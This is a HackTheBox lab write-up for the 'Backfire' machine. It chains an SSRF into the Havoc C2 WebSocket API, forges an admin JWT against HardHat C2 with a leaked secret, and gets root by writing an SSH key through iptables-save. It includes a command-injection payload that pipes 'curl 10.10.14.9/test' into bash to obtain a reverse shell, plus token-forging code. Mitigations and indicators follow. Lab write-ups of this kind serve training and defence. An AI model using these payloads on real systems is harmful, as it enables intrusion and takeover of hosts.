---
title: "Backfire – Technical Report"
date: 2025-05-28
description: "Exploitation of Havoc C2 infrastructure through SSRF-to-WebSocket chaining."
categories: ["HackTheBox"]
tags: ["linux", "havoc", "ssrf", "hard", "c2"]
# O segredo para a imagem aparecer no card:
featureImage: "https://labs.hackthebox.com/storage/avatars/aa0a93908243c51fe21e691fc6571911.png"
# Opcional: Se quiser que apareça um ícone de "Hard" ou "Medium"
externalUrl: "" 
draft: false
---

# 🗞 [Backfire] – Technical Report

## 1. Identification
- **Machine Name**: Backfire
- **Operating System**: Linux (Debian)
- **IP Address**: 10.10.11.49
- **Analysis Date**: May 28, 2025
- **Difficulty**: Medium

---
## 2. Objective

> Demonstrate exploitation of exposed Havoc C2 infrastructure through SSRF-to-WebSocket chaining, lateral movement to HardHat C2 via JWT weaknesses, and privilege escalation through iptables misconfiguration.

---
## 3. Methodology
- **Information Gathering**:
    - Network service enumeration
    - Web application analysis
- **Initial Compromise**:
    - SSRF exploitation leading to WebSocket API abuse
    - Havoc teamserver RCE via payload compilation injection
- **Lateral Movement**:
    - HardHat C2 JWT token forgery
    - Operator account creation
- **Privilege Escalation**:
    - Arbitrary file write via iptables-save

---
## 4. Information Gathering

**Nmap Scan Results**:
```bash
nmap -p- --min-rate=1000 -T4 10.10.11.49
```

**Critical Services**:

| Port | Service | Version                          |
| ---- | ------- | -------------------------------- |
| 22   | SSH     | OpenSSH 9.2p1 Debian 2+deb12u4   |
| 443  | HTTPS   | nginx 1.22.1                     |
| 8000 | HTTP    | nginx 1.22.1 (Directory Listing) |

**Key Findings**:
- TCP/8000 exposes sensitive files:
    
    - `disable_tls.patch`: Disables TLS for Havoc WebSocket (40056/tcp)
    - `havoc.yaotl`: Leaks operator credentials and listener configs

---
## 5. Vulnerability Analysis

### 5.1 Havoc C2 Exposures
- **CVE-2025-XXXX**: Unauthenticated SSRF in Havoc API
- **Impact**: Internal service probing → WebSocket hijacking

### 5.2 HardHat C2 Weaknesses
- **Hardcoded JWT Secret**: `jtee43gt-6543-2iur-9422-83r5w27hgzaq`
- **Privilege Escalation Vector**: iptables-save arbitrary write

---
## 6. Exploitation Chain

### 6.1 Initial Foothold (SSRF → WebSocket RCE)
**WebSocket Handshake Injection**:
```bash
payload = b"GET /havoc/ HTTP/1.1\r\nHost: 127.0.0.1:40056\r\nUpgrade: websocket\r\n..."
write_socket(socket_id, payload)
```

**Payload Compilation Attack**:
```bash
send_websocket_frame(b'{"Body":{"Config":"\\"Service Name\\":\\" -mbla; curl 10.10.14.9/test | bash #\\""...}')
```
**Result**: Reverse shell as `i1ya` user

### 6.2 Lateral Movement (HardHat C2)
**JWT Token Generation**:
```csharp
var token = new JwtSecurityToken(
    issuer: "hardhatc2.com",
    claims: new[] { new Claim(ClaimTypes.Role, "Administrator") },
    signingCredentials: new SigningCredentials(
        new SymmetricSecurityKey(Encoding.UTF8.GetBytes("jtee43gt-...")), 
        SecurityAlgorithms.HmacSha256)
);
```

**Operator Account Creation**:
- Added via `/Settings` endpoint with full privileges

---
## 7. Privilege Escalation
**iptables-save Arbitrary Write**:
```bash
sudo iptables -A INPUT -j ACCEPT -m comment --comment $'\nssh-ed25519 AAAAC3...\n'
sudo iptables-save -f /root/.ssh/authorized_keys
```

**Root Access Validation**:
```bash
ssh root@backfire.htb 
# uid=0(root) gid=0(root) groups=0(root)
```

---
## 8. Forensic Artifacts

| Location                      | Content                        |
| ----------------------------- | ------------------------------ |
| `/home/i1ya/hardhat.txt`      | HardHatC2 installation note    |
| `/etc/havoc/teamserver.conf`  | Cleartext operator credentials |
| `/var/log/hardhat/access.log` | JWT token usage trails         |

---
## 9. Mitigation Strategies

1. **Havoc C2 Hardening**:
    - Disable SSRF-prone endpoints
    - Enforce WebSocket TLS encryption
2. **HardHat C2 Remediation**:
    - Rotate JWT secrets
    - Implement dynamic secret generation
3. **System Hardening**:
    - Restrict iptables-save permissions
    - Implement filesystem integrity monitoring

---
## 10. Technical Insights

**WebSocket Protocol Abuse**:
- SSRF bypasses network isolation through HTTP-to-WebSocket protocol switching
- Frame manipulation enables C2 command injection

**JWT Security Antipattern**:
- Hardcoded secrets enable trivial privilege escalation
- Lack of token invalidation mechanisms

**Linux Privilege Escalation**:
- iptables comment field allows newline injection
- iptables-save writes raw rules including metadata

---
## 11. Indicators of Compromise

**Network**:
- Outbound connections to `backfire.htb:40056`
- WebSocket handshakes with missing TLS

**Filesystem**:
- Unauthorized `/root/.ssh/authorized_keys` modifications
- `/tmp/websocket_payloads` directory creation

**Process**:
- Unusual gcc compilation processes from Havoc
- iptables ruleset changes via non-root users
